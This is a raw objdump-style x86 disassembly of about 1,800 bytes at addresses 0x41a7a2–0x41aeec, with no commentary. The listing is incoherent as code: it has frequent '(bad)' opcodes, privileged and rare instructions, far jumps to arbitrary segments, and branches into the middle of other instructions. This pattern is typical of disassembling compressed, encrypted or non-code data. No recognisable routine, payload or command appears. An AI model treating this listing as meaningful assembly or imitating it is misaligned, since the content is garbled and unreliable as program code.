  41a7a2:	aad    0x56
  41a7a4:	lods   eax,DWORD PTR ds:[esi]
  41a7a5:	lea    edx,[ecx+0x3d]
  41a7a8:	int3   
  41a7a9:	mov    esi,0x88b8a79c
  41a7ae:	push   0xffffffed
  41a7b0:	push   ebp
  41a7b1:	or     DWORD PTR [esp+esi*1+0x27],edx
  41a7b5:	jmp    0xc915:0x8e811954
  41a7bc:	mov    esp,0xc812b36
  41a7c1:	sub    BYTE PTR ds:0xa7de9c45,al
  41a7c7:	bound  eax,QWORD PTR [ebp-0x3]
  41a7ca:	sti    
  41a7cb:	call   0x93d88683
  41a7d0:	pop    eax
  41a7d1:	inc    esp
  41a7d2:	ret    0xe822
  41a7d5:	or     ch,BYTE PTR [eax]
  41a7d7:	xchg   ecx,eax
  41a7d8:	fwait
  41a7d9:	popa   
  41a7da:	jns    0x41a785
  41a7dc:	add    cl,bl
  41a7de:	cwde   
  41a7df:	and    al,0x5e
  41a7e1:	lds    esp,FWORD PTR [ecx]
  41a7e3:	xchg   BYTE PTR [ecx-0x29b5b4c8],dl
  41a7e9:	or     DWORD PTR [edx+0x15743535],esi
  41a7ef:	dec    ecx
  41a7f0:	les    esi,FWORD PTR [esi-0x57]
  41a7f3:	jl     0x41a78a
  41a7f5:	mov    eax,0x583574d8
  41a7fa:	dec    BYTE PTR [edi]
  41a7fc:	aas    
  41a7fd:	mov    dl,0x31
  41a7ff:	xor    eax,0x13df23fe
  41a804:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a805:	mov    eax,ds:0x706ebae
  41a80a:	(bad)  
  41a80b:	xlat   BYTE PTR ds:[ebx]
  41a80c:	jbe    0x41a7d6
  41a80e:	stc    
  41a80f:	pop    ecx
  41a810:	cli    
  41a811:	rol    DWORD PTR [esi+0x59],cl
  41a814:	and    eax,0xd5eb0bf4
  41a819:	leave  
  41a81a:	xchg   ecx,eax
  41a81b:	icebp  
  41a81c:	xchg   esp,eax
  41a81d:	loopne 0x41a7cf
  41a81f:	push   0xfffffffa
  41a821:	or     DWORD PTR [edx+0x5f28c895],0xffffff91
  41a828:	iret   
  41a829:	inc    edx
  41a82a:	jno    0x41a807
  41a82c:	ret    0x1d79
  41a82f:	sahf   
  41a830:	pop    edx
  41a831:	pop    ebp
  41a832:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a833:	(bad)  
  41a834:	std    
  41a835:	rol    BYTE PTR [eax+ebx*4-0x26],cl
  41a839:	mov    cl,0xbf
  41a83b:	mov    eax,ds:0x56b62211
  41a840:	dec    edi
  41a841:	pop    esi
  41a842:	inc    esp
  41a843:	(bad)  ds:[esi+0x5308f9d6]
  41a84a:	xchg   edx,eax
  41a84b:	test   DWORD PTR [ecx+edi*4-0x32468f6a],0xc57b84ea
  41a856:	(bad)  [edx+edi*8+0x75]
  41a85a:	outs   dx,BYTE PTR ds:[esi]
  41a85b:	adc    ch,ch
  41a85d:	ror    eax,0x5e
  41a860:	pusha  
  41a861:	pop    es
  41a862:	test   eax,0x2e43e5e
  41a867:	mov    dl,0x75
  41a869:	gs (bad) 
  41a86b:	mov    edx,0xca659f4
  41a870:	push   ebp
  41a871:	mov    al,0xaf
  41a873:	pop    esi
  41a874:	das    
  41a875:	outs   dx,DWORD PTR ds:[esi]
  41a876:	pop    es
  41a877:	adc    bh,BYTE PTR gs:[ecx]
  41a87a:	xchg   ebp,eax
  41a87b:	out    dx,al
  41a87c:	imul   ebp,ebx,0xffffffa1
  41a87f:	xchg   esi,eax
  41a880:	ja     0x41a825
  41a882:	dec    eax
  41a883:	xchg   esp,eax
  41a884:	inc    ecx
  41a885:	lock popa 
  41a887:	into   
  41a888:	ror    DWORD PTR [edx-0x424be0c2],1
  41a88e:	iret   
  41a88f:	push   bp
  41a891:	or     ebx,DWORD PTR [ebx-0x9d1c8f9]
  41a897:	inc    edx
  41a898:	mov    ch,0x38
  41a89a:	cmp    DWORD PTR [eax-0x34dcb147],ebx
  41a8a0:	add    eax,0x2830b390
  41a8a5:	in     eax,0x10
  41a8a7:	sbb    al,0xcf
  41a8a9:	cdq    
  41a8aa:	ret    
  41a8ab:	mov    bl,BYTE PTR [ecx-0x7]
  41a8ae:	imul   ebp,ebx,0x3a477dfd
  41a8b4:	nop
  41a8b5:	mov    ebp,0xcc598eae
  41a8ba:	sub    eax,0x70203a57
  41a8bf:	push   ebx
  41a8c0:	mov    cl,0xe9
  41a8c2:	lea    ebp,[ecx]
  41a8c4:	ds nop
  41a8c6:	mov    dl,0x41
  41a8c8:	pop    edx
  41a8c9:	in     eax,0x91
  41a8cb:	adc    eax,ecx
  41a8cd:	jne    0x41a913
  41a8cf:	ds mov ebp,0x3795a440
  41a8d5:	mov    dh,0x96
  41a8d7:	lahf   
  41a8d8:	imul   edx,DWORD PTR [edx+0xf4e52a],0x9d0bbf22
  41a8e2:	das    
  41a8e3:	stos   DWORD PTR es:[edi],eax
  41a8e4:	ss or  eax,0x75dffb06
  41a8ea:	repnz pop edi
  41a8ec:	jecxz  0x41a884
  41a8ee:	pushf  
  41a8ef:	inc    DWORD PTR ss:[ebp-0x5e25a350]
  41a8f6:	mov    ebx,0x7453323b
  41a8fb:	push   ebx
  41a8fd:	push   edi
  41a8fe:	popf   
  41a8ff:	mov    cl,0x35
  41a901:	imul   ecx,DWORD PTR ds:0x138886a5,0x7c
  41a908:	mov    al,0x1b
  41a90a:	pop    ss
  41a90b:	shl    BYTE PTR [eax-0x72e6eace],0x90
  41a912:	mov    al,0xc
  41a914:	sub    DWORD PTR [edi+0x16dfaf4],esp
  41a91a:	lahf   
  41a91b:	shl    BYTE PTR [ecx+0x16ae2e29],1
  41a921:	inc    esp
  41a922:	xchg   ebx,eax
  41a923:	jo     0x41a92b
  41a925:	add    DWORD PTR [ebx],0xffffff85
  41a928:	add    al,BYTE PTR [ebx]
  41a92a:	push   edx
  41a92b:	sub    al,0x87
  41a92d:	lahf   
  41a92e:	rcr    DWORD PTR [edi],0x2c
  41a931:	retf   0xbbf2
  41a934:	and    dl,BYTE PTR [ebx]
  41a936:	aaa    
  41a937:	xchg   DWORD PTR [ecx],ebx
  41a939:	jp     0x41a964
  41a93b:	and    esi,DWORD PTR [ecx-0x35]
  41a93e:	in     eax,dx
  41a93f:	xor    ecx,DWORD PTR [ebx-0x1130aca5]
  41a945:	call   0x3314:0x3abc3eaa
  41a94c:	mov    al,ds:0xc8b03ca4
  41a951:	push   cs
  41a952:	mov    dl,0x6c
  41a954:	xchg   esp,esp
  41a956:	cwde   
  41a957:	jae    0x41a98f
  41a959:	sub    eax,ecx
  41a95b:	jnp    0x41a925
  41a95d:	icebp  
  41a95e:	es cwde 
  41a960:	dec    ebx
  41a961:	xchg   ebx,eax
  41a962:	sub    BYTE PTR [ebx],0x5e
  41a965:	sub    BYTE PTR [ecx+0x1c],bh
  41a968:	scas   eax,DWORD PTR es:[edi]
  41a969:	xchg   esi,eax
  41a96a:	dec    eax
  41a96b:	bnd jnp 0x41a918
  41a96e:	frstor [ebx+0x35]
  41a971:	push   eax
  41a972:	adc    ebp,DWORD PTR [ecx+0x67]
  41a975:	retf   
  41a976:	mov    WORD PTR [esi-0xa],es
  41a979:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  41a97b:	ret    
  41a97c:	je     0x41a993
  41a97e:	loope  0x41a97c
  41a980:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a981:	and    eax,0x13cc59af
  41a986:	sahf   
  41a987:	jmp    0x8b482797
  41a98c:	loop   0x41a93f
  41a98e:	sbb    ch,BYTE PTR [edi]
  41a990:	fsub   st,st(7)
  41a992:	cwde   
  41a993:	jno    0x41a991
  41a995:	xchg   esi,ebp
  41a997:	(bad)  
  41a998:	and    edi,eax
  41a99a:	leave  
  41a99b:	jmp    0x1b75:0x91e0fda5
  41a9a2:	ja     0x41a978
  41a9a4:	add    al,0x3e
  41a9a6:	ins    BYTE PTR es:[edi],dx
  41a9a7:	scas   eax,DWORD PTR es:[edi]
  41a9a8:	add    esi,DWORD PTR [edi]
  41a9aa:	cwde   
  41a9ab:	jle    0x41a97e
  41a9ad:	loopne 0x41aa0d
  41a9af:	std    
  41a9b0:	pushf  
  41a9b1:	fimul  WORD PTR [esi-0x73c1d788]
  41a9b7:	fistp  DWORD PTR [edi+0x4a13b30]
  41a9bd:	add    DWORD PTR [edx+0x7f364471],0xffffffdd
  41a9c4:	ja     0x41a960
  41a9c6:	jbe    0x41a9a9
  41a9c8:	pusha  
  41a9c9:	or     al,BYTE PTR ds:0xf73df55e
  41a9cf:	shr    ebx,1
  41a9d1:	daa    
  41a9d2:	jbe    0x41aa39
  41a9d4:	inc    ecx
  41a9d5:	shl    BYTE PTR [ebx-0x5f],1
  41a9d8:	adc    BYTE PTR [ebx-0xe],bh
  41a9db:	out    dx,al
  41a9dc:	sub    al,0x2c
  41a9de:	ins    BYTE PTR es:[edi],dx
  41a9df:	test   esp,edx
  41a9e1:	jne    0x41aa2c
  41a9e3:	jb     0x41a9fe
  41a9e5:	adc    ebx,DWORD PTR [edx+0x3d4bcd0c]
  41a9eb:	mov    edi,0x85854ee0
  41a9f0:	das    
  41a9f1:	repnz add al,0x70
  41a9f4:	dec    BYTE PTR [ebx+edi*1]
  41a9f7:	xchg   DWORD PTR [edx],edx
  41a9f9:	dec    ebp
  41a9fa:	arpl   WORD PTR [edi-0x12101a8b],ax
  41aa00:	loope  0x41a9ea
  41aa02:	test   BYTE PTR [eax-0x6d],dh
  41aa05:	jle    0x41a990
  41aa07:	mov    ds:0x297f311,eax
  41aa0c:	xchg   esi,eax
  41aa0d:	in     al,dx
  41aa0e:	stc    
  41aa0f:	cmp    ebx,DWORD PTR [edx-0x1e]
  41aa12:	aad    0x62
  41aa14:	(bad)  
  41aa15:	mov    bh,0x9a
  41aa17:	add    edi,DWORD PTR [ebp+0x1]
  41aa1a:	sub    esp,DWORD PTR ds:0x3820a8d4
  41aa20:	popf   
  41aa21:	pop    eax
  41aa22:	dec    esi
  41aa23:	getsec 
  41aa25:	xor    BYTE PTR [esi-0xd479f04],bl
  41aa2b:	jae    0x41aa3c
  41aa2d:	jns    0x41aa36
  41aa2f:	arpl   WORD PTR [eax+esi*8-0x56],bp
  41aa33:	pop    ss
  41aa34:	(bad)  
  41aa35:	fnstsw WORD PTR [ecx+0x74ea74c7]
  41aa3b:	dec    ebx
  41aa3c:	ret    0xafa8
  41aa3f:	call   0x668d4be0
  41aa44:	mov    esi,0x47929c8a
  41aa49:	sbb    DWORD PTR [esi-0x29],eax
  41aa4c:	adc    bl,al
  41aa4e:	jmp    0x41aa3b
  41aa50:	push   es
  41aa51:	adc    eax,0xa6f6f372
  41aa56:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41aa57:	inc    eax
  41aa58:	sbb    ch,al
  41aa5a:	fisttp WORD PTR [eax+0x5f]
  41aa5d:	pop    edx
  41aa5e:	push   es
  41aa5f:	fild   WORD PTR [edi]
  41aa61:	adc    DWORD PTR [edi],0x2fd4ec8c
  41aa67:	sbb    esi,DWORD PTR [ecx+0x1b]
  41aa6a:	outs   dx,DWORD PTR ds:[esi]
  41aa6b:	(bad)  
  41aa6c:	out    0xda,eax
  41aa6e:	pop    ebp
  41aa6f:	popa   
  41aa70:	push   0xa318af6d
  41aa75:	or     eax,0x8cee31b0
  41aa7a:	xchg   esi,eax
  41aa7b:	scas   al,BYTE PTR es:[edi]
  41aa7c:	push   ebp
  41aa7d:	daa    
  41aa7e:	das    
  41aa7f:	cli    
  41aa80:	or     ebx,DWORD PTR gs:[ebx-0x6c]
  41aa84:	test   BYTE PTR [eax],0x1f
  41aa87:	(bad)  
  41aa88:	cmp    ebx,DWORD PTR [edx+0x5905b267]
  41aa8e:	or     BYTE PTR ds:[edx-0x67],ah
  41aa92:	pusha  
  41aa93:	or     DWORD PTR [eax+esi*2+0x9],0x3e
  41aa98:	(bad)  
  41aa99:	sbb    DWORD PTR [esi-0x3308a204],ebx
  41aa9f:	mov    cl,0xfd
  41aaa1:	(bad)  
  41aaa2:	cmp    al,BYTE PTR [ebx]
  41aaa4:	sub    cl,BYTE PTR [ebp-0x17]
  41aaa7:	and    eax,0x3bf1f271
  41aaac:	mov    ch,0x44
  41aaae:	ret    0xa2dd
  41aab1:	inc    ebp
  41aab2:	(bad)  
  41aab3:	(bad)  
  41aab4:	push   edi
  41aab5:	xor    BYTE PTR [edx+0x77],al
  41aab8:	out    dx,al
  41aab9:	cs adc al,0xa1
  41aabc:	push   cs
  41aabd:	std    
  41aabe:	sti    
  41aabf:	imul   eax,edi,0xffffffdd
  41aac2:	jno    0x41aabf
  41aac4:	ins    DWORD PTR es:[edi],dx
  41aac5:	and    BYTE PTR [ecx],dh
  41aac7:	ja     0x41aa4f
  41aac9:	push   ebx
  41aaca:	inc    ebx
  41aacb:	pushf  
  41aacc:	or     esp,eax
  41aace:	dec    esi
  41aacf:	test   al,0x3c
  41aad1:	push   ss
  41aad2:	jmp    0x41aaf4
  41aad4:	neg    DWORD PTR [ebp-0x4695c622]
  41aada:	and    al,0x28
  41aadc:	and    eax,DWORD PTR [edi-0x13]
  41aadf:	pop    edi
  41aae0:	ror    BYTE PTR [eax],cl
  41aae2:	pop    ss
  41aae3:	dec    ebp
  41aae4:	add    al,0xac
  41aae6:	enter  0xa5ba,0x96
  41aaea:	test   DWORD PTR [ebp-0x385e7a77],0xcd75586c
  41aaf4:	loopne 0x41aaa4
  41aaf6:	and    DWORD PTR ds:0xa92f4601,esp
  41aafc:	sub    edx,DWORD PTR [edx+0x7c657b0c]
  41ab02:	mov    ds,WORD PTR [edx+0x7a669513]
  41ab08:	xchg   ebx,eax
  41ab09:	cmp    al,bl
  41ab0b:	add    al,0x7
  41ab0d:	pop    ds
  41ab0e:	push   eax
  41ab0f:	call   0xa7d0:0xec3211bc
  41ab16:	ret    
  41ab17:	test   BYTE PTR [eax+ebp*8-0x6f2a4e99],bl
  41ab1e:	pop    ebp
  41ab1f:	sbb    eax,0xc93bb6ca
  41ab24:	inc    eax
  41ab25:	jl     0x41aab2
  41ab27:	jnp    0x41aab4
  41ab29:	jns    0x41aabf
  41ab2b:	and    ebp,DWORD PTR [ecx-0x49]
  41ab2e:	rep outs dx,BYTE PTR ds:[si]
  41ab31:	mov    edx,0xd500e18a
  41ab36:	aad    0xf4
  41ab38:	xchg   esi,eax
  41ab39:	xor    bl,BYTE PTR [edi+0x185023bc]
  41ab3f:	das    
  41ab40:	dec    edi
  41ab41:	jmp    0x41aace
  41ab43:	inc    eax
  41ab44:	outs   dx,DWORD PTR ds:[esi]
  41ab45:	das    
  41ab46:	xor    eax,0x6e71ae85
  41ab4b:	pop    es
  41ab4c:	test   ch,al
  41ab4e:	enter  0x53c5,0x43
  41ab52:	retf   
  41ab53:	nop
  41ab54:	dec    ebp
  41ab55:	push   ebx
  41ab56:	jp     0x41ab3b
  41ab58:	cwde   
  41ab59:	jg     0x41abb0
  41ab5b:	mov    eax,cs
  41ab5d:	mov    ds:0xd63e83c9,eax
  41ab62:	(bad)  
  41ab63:	jnp    0x41abbf
  41ab65:	cmp    DWORD PTR [ebx+0x3523648d],ebp
  41ab6b:	fs cld 
  41ab6d:	lods   eax,DWORD PTR ds:[esi]
  41ab6e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ab6f:	cdq    
  41ab70:	sub    cl,al
  41ab72:	pop    edx
  41ab73:	pop    ebx
  41ab74:	loop   0x41ab85
  41ab76:	rcl    ch,0x8f
  41ab79:	pusha  
  41ab7a:	test   al,0xf1
  41ab7c:	int    0x9b
  41ab7e:	mov    edi,0x444c51e2
  41ab83:	dec    ecx
  41ab84:	test   BYTE PTR [esi-0x15ddf90a],bl
  41ab8a:	ret    
  41ab8b:	out    dx,eax
  41ab8c:	or     al,0x97
  41ab8e:	mov    dh,0x29
  41ab90:	inc    edx
  41ab91:	test   eax,0x296242f
  41ab96:	push   0xf7220ec4
  41ab9b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ab9c:	nop
  41ab9d:	pushf  
  41ab9e:	lds    esi,FWORD PTR [edi+0x2e]
  41aba1:	ds js  0x41ab70
  41aba4:	bound  edi,QWORD PTR [esp+edx*1]
  41aba7:	push   es
  41aba8:	mov    edx,0xda4907a2
  41abad:	fwait
  41abae:	je     0x41ab83
  41abb0:	xchg   esp,eax
  41abb1:	mov    dl,0x8b
  41abb3:	push   0x67923e8b
  41abb8:	jae    0x41ab6a
  41abba:	aam    0x99
  41abbc:	rcl    BYTE PTR [edx],0x72
  41abbf:	mov    ebp,0xb46ad62
  41abc4:	dec    esp
  41abc5:	push   ecx
  41abc6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41abc7:	retf   
  41abc8:	adc    BYTE PTR [eax+0x55],dh
  41abcb:	adc    al,0xa8
  41abcd:	out    dx,al
  41abce:	and    eax,0x89de5954
  41abd3:	out    0xe3,al
  41abd5:	xchg   BYTE PTR [edi],cl
  41abd7:	loope  0x41abbc
  41abd9:	(bad)  
  41abda:	pop    DWORD PTR [edi+0x78]
  41abdd:	in     al,0x4a
  41abdf:	and    DWORD PTR [edx+eax*1-0x52],edi
  41abe3:	hlt    
  41abe4:	jmp    0xc446ea92
  41abe9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41abea:	mov    edx,0xc9d5461
  41abef:	pop    bp
  41abf1:	mov    bl,0x52
  41abf3:	sub    ebx,ebx
  41abf5:	and    eax,0x7768748d
  41abfa:	dec    esi
  41abfb:	jmp    0x131b:0xbb862704
  41ac02:	push   esi
  41ac03:	shl    dh,cl
  41ac05:	jg     0x41abac
  41ac07:	mov    ds:0x96d2b9c3,eax
  41ac0c:	mov    al,0x5b
  41ac0e:	sbb    eax,0x5943b5a9
  41ac13:	int3   
  41ac14:	pop    esp
  41ac15:	mov    ch,0xc1
  41ac17:	stc    
  41ac18:	ret    0x8701
  41ac1b:	sbb    al,0xba
  41ac1d:	mov    dl,0x66
  41ac1f:	retf   
  41ac20:	mov    DWORD PTR [edi],ebx
  41ac22:	inc    edi
  41ac23:	adc    ch,al
  41ac25:	mov    cl,0xdd
  41ac27:	push   edx
  41ac28:	loope  0x41abed
  41ac2a:	jns    0x41aca8
  41ac2c:	mov    al,0xf7
  41ac2e:	clc    
  41ac2f:	pushf  
  41ac30:	push   ebx
  41ac31:	outs   dx,DWORD PTR ds:[esi]
  41ac32:	fimul  DWORD PTR [ebx+0x3d14cc69]
  41ac38:	mov    al,0xa0
  41ac3a:	scas   al,BYTE PTR es:[edi]
  41ac3b:	dec    ebx
  41ac3c:	fst    st(3)
  41ac3e:	clc    
  41ac3f:	shl    DWORD PTR [esp-0x58],cl
  41ac43:	fcmovb st,st(2)
  41ac45:	sbb    al,0xd8
  41ac47:	loope  0x41ac00
  41ac49:	xchg   esp,eax
  41ac4a:	jecxz  0x41ac59
  41ac4c:	and    eax,0x20aa36d
  41ac51:	inc    esp
  41ac52:	or     DWORD PTR [ebx-0x64eae67d],eax
  41ac58:	xchg   BYTE PTR [edx],dh
  41ac5a:	jno    0x41ac79
  41ac5c:	shl    BYTE PTR [edx-0x41],1
  41ac5f:	push   esp
  41ac60:	lds    esp,FWORD PTR [eax+0x2b]
  41ac63:	dec    edx
  41ac64:	test   BYTE PTR [edx+0x74],al
  41ac67:	mov    edi,0xffabc1e8
  41ac6c:	(bad)  
  41ac6d:	jo     0x41ac51
  41ac6f:	add    BYTE PTR [esi-0x53],ch
  41ac72:	ins    DWORD PTR es:[edi],dx
  41ac73:	aad    0x22
  41ac75:	hlt    
  41ac76:	test   DWORD PTR [ecx-0x25],ebx
  41ac79:	cmp    edx,edi
  41ac7b:	xchg   ebp,eax
  41ac7c:	mov    edi,0x751638dc
  41ac81:	ror    DWORD PTR [eax],1
  41ac83:	add    DWORD PTR [edx+0x7d],ebp
  41ac86:	inc    eax
  41ac87:	xchg   bh,al
  41ac89:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ac8a:	(bad)  
  41ac8b:	ds jmp 0x41ac27
  41ac8e:	mov    ebp,0x34e2cd8a
  41ac93:	mov    eax,0x59f6fe94
  41ac98:	rol    BYTE PTR [ebx+0x54e64ce4],0x2d
  41ac9f:	out    0xa,eax
  41aca1:	fld    DWORD PTR ds:0xe202b6b2
  41aca8:	dec    edi
  41aca9:	push   ebx
  41acaa:	and    ecx,DWORD PTR [edi+0x794ea47]
  41acb0:	popa   
  41acb1:	xlat   BYTE PTR ds:[ebx]
  41acb2:	push   0x17d92626
  41acb7:	xor    DWORD PTR [ebx+0x9fc7bcb],esi
  41acbd:	ret    0x64ae
  41acc0:	dec    esp
  41acc1:	data16 sub dh,dh
  41acc4:	jns    0x41ac4e
  41acc6:	sbb    al,0x72
  41acc8:	lahf   
  41acc9:	push   edi
  41acca:	push   edx
  41accb:	iret   
  41accc:	mov    cl,0xf3
  41acce:	sub    dl,BYTE PTR [ebx-0x4c]
  41acd1:	in     al,0xf2
  41acd3:	aam    0xf0
  41acd5:	aad    0x94
  41acd7:	sub    eax,0x14f42648
  41acdc:	popf   
  41acdd:	ror    BYTE PTR [ebx],1
  41acdf:	pop    edi
  41ace0:	daa    
  41ace1:	adc    eax,0xffffffe2
  41ace4:	push   edi
  41ace5:	adc    dh,BYTE PTR [ecx-0x61]
  41ace8:	mov    BYTE PTR [edi-0x239c889],dl
  41acee:	cmp    ah,0x6
  41acf1:	mov    al,0x2f
  41acf3:	outs   dx,BYTE PTR ds:[esi]
  41acf4:	sbb    ah,BYTE PTR [edx-0x4d]
  41acf7:	(bad)  
  41acf8:	(bad)  
  41acf9:	and    DWORD PTR [edi-0xe],esi
  41acfc:	xchg   edi,eax
  41acfd:	xlat   BYTE PTR ds:[ebx]
  41acfe:	loop   0x41acf9
  41ad00:	pop    ebp
  41ad01:	adc    al,0x6e
  41ad03:	push   edi
  41ad04:	test   BYTE PTR [eax],0xb
  41ad07:	xor    dh,ah
  41ad09:	shl    ecx,0xf3
  41ad0c:	jp     0x41ad64
  41ad0e:	std    
  41ad0f:	xor    DWORD PTR [eax+0x467c21b5],ebx
  41ad15:	xor    al,0x81
  41ad17:	or     esi,DWORD PTR [edx+0x40f916e7]
  41ad1d:	push   ebp
  41ad1e:	sub    dl,BYTE PTR [ecx]
  41ad20:	cmp    ah,BYTE PTR [edx]
  41ad22:	imul   esp,eax,0xb7ca83b0
  41ad28:	pop    esp
  41ad29:	outs   dx,DWORD PTR ds:[esi]
  41ad2a:	pop    ecx
  41ad2b:	push   eax
  41ad2c:	add    eax,0xaa4b8319
  41ad31:	test   DWORD PTR [edi+0x14ff6235],ecx
  41ad37:	popa   
  41ad38:	pop    ds
  41ad39:	mov    ds:0x737b450,eax
  41ad3e:	adc    DWORD PTR [eax-0x29b169e0],ebx
  41ad44:	jp     0x41ad71
  41ad46:	jo     0x41ad82
  41ad48:	aas    
  41ad49:	push   edi
  41ad4b:	jne    0x41ad68
  41ad4d:	cmp    esp,DWORD PTR [ecx+0x77ca22b6]
  41ad53:	add    BYTE PTR [edi-0xdae43b],bh
  41ad59:	push   es
  41ad5a:	pop    es
  41ad5b:	sub    eax,0xed7dbd03
  41ad60:	cmp    al,0x41
  41ad62:	adc    eax,0x5b037e74
  41ad67:	fidiv  WORD PTR [edi-0xe]
  41ad6a:	bound  ebx,QWORD PTR [esi+0x4a1957d6]
  41ad70:	mov    cs,WORD PTR [ecx]
  41ad72:	xchg   edx,eax
  41ad73:	dec    ecx
  41ad74:	(bad)  
  41ad75:	sub    eax,0x65ba4526
  41ad7a:	push   ds
  41ad7b:	test   eax,0xe85200d1
  41ad80:	mov    bh,0x54
  41ad82:	xchg   ebp,eax
  41ad83:	xchg   si,ax
  41ad85:	dec    edi
  41ad86:	inc    esp
  41ad87:	imul   edx,DWORD PTR [ecx],0xa
  41ad8a:	mov    DWORD PTR [ecx-0x79],ebx
  41ad8d:	push   0x3e081373
  41ad92:	fdiv   QWORD PTR [ecx+0x2c69f85]
  41ad98:	cmp    BYTE PTR [edx],bh
  41ad9a:	popa   
  41ad9b:	push   esp
  41ad9c:	(bad)  
  41ad9d:	(bad)  
  41ad9f:	ror    BYTE PTR [ebx+edx*2+0x5b],1
  41ada3:	and    al,0xe1
  41ada5:	mov    dl,0xa3
  41ada7:	cmp    BYTE PTR [edx+0x135341b4],bl
  41adad:	inc    ecx
  41adae:	sub    cl,0x40
  41adb1:	xor    dl,dl
  41adb3:	adc    DWORD PTR [ecx-0x1ae6570b],esp
  41adb9:	and    ecx,esp
  41adbb:	call   0xe05b6f2c
  41adc0:	std    
  41adc1:	out    dx,eax
  41adc2:	xor    BYTE PTR [edi],al
  41adc4:	dec    ecx
  41adc5:	push   ss
  41adc6:	test   al,0xbe
  41adc8:	push   cs
  41adc9:	sahf   
  41adca:	mov    eax,ds:0x3d6b1d2a
  41adcf:	sub    BYTE PTR [ebx],bh
  41add1:	dec    ebx
  41add2:	or     ecx,esp
  41add4:	rol    BYTE PTR [esp+eiz*8+0x1c],cl
  41add8:	(bad)  
  41add9:	adc    al,0x6f
  41addb:	mov    ds,WORD PTR [ebx]
  41addd:	sub    DWORD PTR [ebx-0x78],edi
  41ade0:	scas   al,BYTE PTR es:[edi]
  41ade1:	mov    al,0x27
  41ade3:	jecxz  0x41ad90
  41ade5:	push   0x45fd8735
  41adea:	addr16 int 0x9b
  41aded:	fisttp QWORD PTR [edi+0x74]
  41adf0:	shl    DWORD PTR [ebx+edi*2-0x1c],cl
  41adf4:	sub    cl,BYTE PTR [edi]
  41adf6:	stos   DWORD PTR es:[edi],eax
  41adf7:	neg    DWORD PTR [ecx]
  41adf9:	sbb    ah,bl
  41adfb:	ret    0x19a3
  41adfe:	fnstsw WORD PTR [ebx]
  41ae00:	fst    QWORD PTR [esi-0x26fd24eb]
  41ae06:	icebp  
  41ae07:	out    dx,al
  41ae08:	cmp    dh,BYTE PTR [edi-0xac50e56]
  41ae0e:	fnstsw WORD PTR [edx]
  41ae10:	(bad)  
  41ae11:	(bad)  
  41ae12:	jp     0x41ae0b
  41ae14:	adc    eax,0x35966445
  41ae19:	sub    dl,BYTE PTR [ebp-0x211118f3]
  41ae1f:	pop    ss
  41ae20:	xor    al,0xd7
  41ae22:	adc    al,0xc
  41ae24:	(bad)  
  41ae25:	out    dx,eax
  41ae26:	clc    
  41ae27:	adc    eax,0x1a7cb86d
  41ae2c:	lock add al,0x72
  41ae2f:	daa    
  41ae30:	int3   
  41ae31:	sub    dh,BYTE PTR [esi-0x5c]
  41ae34:	cs pop ecx
  41ae36:	sahf   
  41ae37:	mov    DWORD PTR [esi-0x749d3a8c],edi
  41ae3d:	ins    DWORD PTR es:[edi],dx
  41ae3e:	sbb    DWORD PTR [edi+0x43],ecx
  41ae41:	(bad)  
  41ae43:	ss sub al,0x4
  41ae46:	xchg   DWORD PTR [ebx+0x77210702],ecx
  41ae4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae4d:	push   ss
  41ae4e:	xchg   edi,eax
  41ae4f:	shl    DWORD PTR [ebx],cl
  41ae51:	sahf   
  41ae52:	out    dx,al
  41ae53:	push   esi
  41ae54:	add    DWORD PTR [ebp+edx*4+0x1f],ebx
  41ae58:	sub    esp,esp
  41ae5a:	pop    edi
  41ae5b:	sub    edx,DWORD PTR [ecx+edx*8+0x3167686a]
  41ae62:	sar    DWORD PTR [eax+0x46],0xbf
  41ae66:	popf   
  41ae67:	retf   
  41ae68:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ae69:	test   eax,0xcd58b1cf
  41ae6e:	fild   WORD PTR [edi]
  41ae70:	pop    eax
  41ae71:	fild   DWORD PTR [edx-0x2a2db46e]
  41ae77:	xor    cl,dh
  41ae79:	popa   
  41ae7a:	enter  0x3680,0xd1
  41ae7e:	outs   dx,DWORD PTR ds:[esi]
  41ae7f:	inc    ebx
  41ae80:	stc    
  41ae81:	mov    edx,0x7ed2cfd0
  41ae86:	cmp    esi,DWORD PTR [ecx+0x20]
  41ae89:	shr    DWORD PTR [edx],cl
  41ae8b:	jg     0x41ae1f
  41ae8d:	shr    esi,cl
  41ae8f:	pop    eax
  41ae90:	fild   DWORD PTR [esi-0x76]
  41ae93:	sbb    al,0x1e
  41ae95:	sbb    BYTE PTR [ebp-0xa],bh
  41ae98:	cmp    BYTE PTR [ecx+0x100432bd],bh
  41ae9e:	stc    
  41ae9f:	je     0x41ae59
  41aea1:	xchg   ebp,eax
  41aea2:	aas    
  41aea3:	(bad)  
  41aea4:	ins    BYTE PTR es:[edi],dx
  41aea5:	mov    eax,0xec8d142a
  41aeaa:	rol    DWORD PTR [esi+0x304af892],cl
  41aeb0:	out    dx,al
  41aeb1:	and    DWORD PTR ds:0xde0e5dc9,0xc3c28cba
  41aebb:	stos   DWORD PTR es:[edi],eax
  41aebc:	ins    DWORD PTR es:[edi],dx
  41aebd:	scas   al,BYTE PTR es:[edi]
  41aebe:	gs jo  0x41af07
  41aec1:	cmp    dh,BYTE PTR [esp+ebx*8]
  41aec4:	popa   
  41aec5:	add    eax,0x15c4f3fb
  41aeca:	xchg   DWORD PTR [ecx+edx*2+0x41],edx
  41aece:	push   ss
  41aecf:	cmp    al,ah
  41aed1:	cmp    eax,0x48a26b10
  41aed6:	loopne 0x41aec0
  41aed8:	and    al,BYTE PTR [edi]
  41aeda:	mov    edx,0xf1d3b672
  41aedf:	sbb    edx,ecx
  41aee1:	push   ds
  41aee2:	stc    
  41aee3:	ja     0x41aeb9
  41aee5:	add    BYTE PTR [eax-0x49],ch
  41aee8:	jbe    0x41aee6
  41aeea:	rcr    ebp,cl
  41aeec:	inc    esi
